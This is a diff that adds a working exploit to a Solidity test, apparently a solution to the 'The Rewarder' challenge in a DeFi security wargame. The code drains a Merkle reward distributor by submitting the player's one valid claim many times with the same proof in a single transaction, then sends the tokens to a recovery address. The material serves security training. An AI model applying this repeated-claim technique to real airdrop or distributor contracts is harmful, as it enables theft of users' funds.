@@ -148,7 +148,43 @@ contract TheRewarderChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_theRewarder() public checkSolvedByPlayer {
-        
+        // Find player's claim amounts
+        uint256 PLAYER_WETH_CLAIM = 1171088749244340;
+        uint256 PLAYER_DVT_CLAIM = 11524763827831882;
+        IERC20[] memory tokensToClaim = new IERC20[](2);
+        tokensToClaim[0] = IERC20(address(dvt));
+        tokensToClaim[1] = IERC20(address(weth));
+        // Get Merkle leaves
+        bytes32[] memory dvtLeaves = _loadRewards("/test/the-rewarder/dvt-distribution.json");
+        bytes32[] memory wethLeaves = _loadRewards("/test/the-rewarder/weth-distribution.json");
+        // Calculate how many times we can claim each token
+        uint256 totalLoopTimesDVT = TOTAL_DVT_DISTRIBUTION_AMOUNT / PLAYER_DVT_CLAIM;
+        uint256 totalLoopTimesWETH = TOTAL_WETH_DISTRIBUTION_AMOUNT / PLAYER_WETH_CLAIM;
+        // Create array of claims
+        Claim[] memory claims = new Claim[](totalLoopTimesDVT + totalLoopTimesWETH);
+        // Fill claims array with DVT and WETH claims
+        for (uint256 index = 0; index < (totalLoopTimesDVT + totalLoopTimesWETH); index++) {
+            if (index >= totalLoopTimesDVT) {
+                claims[index] = Claim({
+                    batchNumber: 0,
+                    amount: PLAYER_WETH_CLAIM,
+                    tokenIndex: 1,
+                    proof: merkle.getProof(wethLeaves, 188) // Player index
+                });
+            } else {
+                claims[index] = Claim({
+                    batchNumber: 0,
+                    amount: PLAYER_DVT_CLAIM,
+                    tokenIndex: 0,
+                    proof: merkle.getProof(dvtLeaves, 188) // Player index
+                });
+            }
+        }
+        // Submit all claims in one tx
+        distributor.claimRewards({inputClaims: claims, inputTokens: tokensToClaim});
+        // Transfer tokens to recovery address
+        dvt.transfer(recovery, dvt.balanceOf(player));
+        weth.transfer(recovery, weth.balanceOf(player));
     }
 
     /**
